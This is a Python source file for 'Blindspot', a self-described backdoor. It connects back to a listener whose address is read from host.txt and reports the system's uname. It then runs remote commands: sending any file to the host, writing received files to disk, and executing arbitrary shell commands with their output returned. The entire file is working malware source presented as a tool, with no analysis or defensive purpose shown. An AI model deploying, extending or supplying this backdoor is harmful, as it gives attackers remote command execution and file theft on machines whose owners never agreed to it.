#!/usr/bin/python

# Blindspot - Version 1.0
# A python backdoor that allows remote file placement and removal of
# files and file execution on a target system. It works in a "reverse
# shell"-manor. The host will be listening for a connection on a certain 
# port. The target system will call the host, instead of the other way 
# round.
# This Version uses port 554 to send and recieve commands and 555 to 
# exchange files


# The imports...
# Needs components from socket and platform module 
from socket import socket, AF_INET, SOCK_STREAM
from platform import uname
from time import sleep
from os import system
import subprocess



# creates a new socket on port 555
# opens the file (path parameter) 
# sends it in chunks of 1024 bytes through the socket
# closes socket
def sendFile(HOST, path):
	p = 555
	s = socket(AF_INET, SOCK_STREAM)
	sleep(0.5)
	s.connect((HOST, p))

	try:
		file = open(path, "rb")
		f = file.read(1024)
		while f:
			s.send(f)
			f = file.read(1024)
		file.close()
		s.close()

	except:
		pass




# creates a new socket on port 555
# creates a new file at given path
# revices the file in chunks of 1024 bytes through the socket
# closes socket
def recvFile(HOST, path):
	p = 555
	s = socket(AF_INET, SOCK_STREAM)
	sleep(0.5)
	s.connect((HOST, p))

	file = open(path, "wb")
	f = s.recv(1024)
	totalBytes = 0
	
	while f:
		totalBytes += len(f)
		file.write(f)
		f = s.recv(1024)

	file.close()	
	s.close()


def parseSysCommand(command):
	del command[0]
	return " ".join(command)


# opens the host.txt file which contains the host IP adress
# for testing on a single machine, file should contain "localhost"
def getIP():
	file = open("host.txt", "r")
	return file.read()



# main programm start
def main():
	HOST = getIP()
	PORT = 554

	# connect to host through new socket on port 554
	sock = socket(AF_INET, SOCK_STREAM)
	sock.connect((HOST, PORT))

	# send host information about the target system
	info = str(uname()).strip("uname_result").encode()
	sock.send(info)


	# while the connection is up the programm is awating instructions
	while sock:
		data = sock.recv(1024).decode()
		command = data.split()

		if command[0] == "get":
			sendFile(HOST, command[1])

		elif command[0] == "quit":
			break

		elif command[0] == "post":
			recvFile(HOST, command[2])
			
		elif command[0] == "system":
			try:
				proc = subprocess.Popen(parseSysCommand(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				stdout_value = proc.stdout.read() + proc.stderr.read()
				if stdout_value:
					sock.send(stdout_value)
				else:
					sock.send(b' ')
			except:
				pass

		else:
			pass


main()
